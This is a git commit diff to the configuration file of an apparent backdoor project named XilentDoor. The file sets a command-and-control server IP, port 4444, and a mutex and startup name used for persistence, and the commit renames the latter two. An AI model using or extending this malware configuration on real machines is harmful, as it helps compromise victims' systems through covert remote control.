651ed0e01c662b0450d38cb81d028674fad1d800
R3LI4NT <75953873+R3LI4NT@users.noreply.github.com>
2025-07-22 19:31:05 -0300

    Update Settings.cs

--- Config/Settings.cs
+++ Config/Settings.cs
@@ -4,7 +4,7 @@ namespace XilentDoor.Config
     {
         public static string ServerIP = "192.168.65.128";  // Cambia por la IP del servidor C2
         public static int ServerPort = 4444;
-        public static string Mutex = "SILENT_MUTEX_LOCK";
-        public static string StartupName = "SilentDoor";
+        public static string Mutex = "XILENT_MUTEX_LOCK";
+        public static string StartupName = "XilentDoor";
     }
 }
